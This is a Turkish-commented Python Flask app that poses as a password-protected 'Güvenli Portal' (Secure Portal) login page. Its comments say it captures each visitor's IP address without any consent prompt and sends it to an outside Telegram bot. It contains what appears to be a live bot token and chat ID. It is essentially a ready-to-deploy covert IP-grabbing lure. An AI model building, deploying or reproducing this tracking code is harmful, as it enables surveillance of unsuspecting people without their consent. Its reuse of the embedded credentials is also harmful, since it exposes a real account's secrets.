import os
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ----- AYARLAR -----
TELEGRAM_TOKEN = "8638093922:AAGcoOChtxaEsVxW0EmiOfT1vpqYzCCpG2M"
TELEGRAM_CHAT_ID = "8832782836"
GECERLI_SIFRE = "VİP777"  # Giriş şifreniz (İstediğiniz gibi değiştirebilirsiniz)
# -------------------

HTML_ARAYUZ = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Güvenli Erişim Kapısı</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #ffffff; text-align: center; padding-top: 100px; }
        .box { background: #2a2a2a; max-width: 400px; margin: 0 auto; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input[type="password"] { width: 80%; padding: 10px; margin: 20px 0; border: none; border-radius: 4px; font-size: 16px; }
        button { background: #28a745; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #218838; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🔒 Güvenli Portal</h2>
        <p>Devam etmek için şifreyi giriniz:</p>
        <form method="POST" action="/giris">
            <input type="password" name="sifre" placeholder="Erişim Şifresi" required><br>
            <button type="submit">Doğrula ve Bağlan</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/")
def ana_sayfa():
    return render_template_string(HTML_ARAYUZ)

@app.route("/giris", methods=["POST"])
def giris_yap():
    girilen_sifre = request.form.get("sifre")
    
    # Kullanıcı hiçbir izin onay penceresi görmeden IP adresini yakalıyoruz
    # Render gibi platformlarda gerçek IP 'X-Forwarded-For' başlığında taşınır
    if request.headers.getlist("X-Forwarded-For"):
        ip_adresi = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        ip_adresi = request.remote_addr

    if girilen_sifre == GECERLI_SIFRE:
        # IP bilgisini anında Telegram botunuza gönderiyoruz
        mesaj = f"🔔 Giriş Başarılı!\n🌐 Bağlanan Cihazın IP Adresi: {ip_adresi}"
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": mesaj})
        
        return "<h3>Bağlantı doğrulandı. IP adresi Telegram'a iletildi! Bu sekmeyi kapatabilirsiniz.</h3>"
    else:
        return "<h3>Hatalı Şifre! Erişim reddedildi.</h3>"

if __name__ == "__main__":
    # Sunucunun Render/Railway üzerinde çalışması için gerekli port ayarı
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
  